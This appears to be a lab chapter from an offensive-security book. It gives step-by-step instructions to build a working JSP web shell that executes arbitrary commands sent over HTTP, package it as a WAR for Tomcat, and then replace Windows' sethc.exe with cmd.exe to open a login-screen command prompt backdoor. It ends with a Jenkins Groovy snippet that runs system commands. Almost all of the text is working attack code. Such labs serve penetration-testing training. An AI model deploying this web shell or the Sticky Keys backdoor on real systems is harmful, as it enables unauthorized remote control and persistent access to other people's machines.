# Chapter 5 Instructions

## Setup the Environment

1. Create a directory named `webshell`:

   ```bash
   mkdir webshell
   ```

2. Change to the `webshell` directory:

   ```bash
   cd webshell
   ```

3. Install the Java Development Kit (JDK):

   ```bash
   apt install default-jdk
   ```

## Create the Web Shell JSP File

1. Create a JSP file (`index.jsp`) with the following content:

   ```jsp
   <FORM METHOD=GET ACTION='index.jsp'>
   <INPUT name='cmd' type=text>
   <INPUT type=submit value='Run'>
   </FORM>
   <%@ page import="java.io.*" %>
   <%
       String cmd = request.getParameter("cmd");
       String output = "";
       if(cmd != null) {
           String s = null;
           try {
               Process p = Runtime.getRuntime().exec(cmd,null,null);
               BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
               while((s = sI.readLine()) != null) { output += s+"</br>"; }
           } catch(IOException e) { e.printStackTrace(); }
       }
   %>
   <pre><%=output %></pre>
   <FORM METHOD=GET ACTION='index.jsp'>
   ```

   This code creates a web form that allows users to input and execute shell commands through a web interface. The commands' output is displayed on the same page.

## Package and Deploy

1. List the directory contents and file permissions:

   ```bash
   ls -lah
   ```

2. Package the webshell into a WAR file to deploy on Tomcat:

   ```bash
   jar cvf ../webshell.war *
   ```

## Post-Deployment Commands

1. Display all network configuration values:

   ```bash
   ipconfig /all
   ```

2. Backup the Sticky Keys executable:

   ```cmd
   cmd.exe /c copy c:\windows\system32\sethc.exe c:\windows\system32\sethc.exe.backup
   ```

3. Check permissions for the Sticky Keys executable:

   ```cmd
   c:\windows\system32\cacls.exe c:\windows\system32\sethc.exe
   ```

4. Take ownership and grant full permissions to `sethc.exe`:

   ```cmd
   cmd.exe /C takeown /F C:\Windows\System32\sethc.exe && echo Y | icacls C:\Windows\System32\sethc.exe /grant Administrators:F
   ```

5. Re-check permissions for verification:

   ```cmd
   c:\windows\system32\cacls.exe c:\windows\system32\sethc.exe
   ```

6. Replace `sethc.exe` with `cmd.exe` to enable command line access from the login screen:

   ```cmd
   cmd.exe /c copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe /Y
   ```

## Jenkins Script

1. Execute and print the output of `ipconfig /all` using a Groovy script in Jenkins:

   ```groovy
   def sout = new StringBuffer(), serr = new StringBuffer()
   def proc = 'ipconfig /all'.execute()
   proc.consumeProcessOutput(sout, serr)
   proc.waitForOrKill(1000)
   println "out> $sout err> $serr"
   ```

   This Groovy script executes the `ipconfig /all` command.
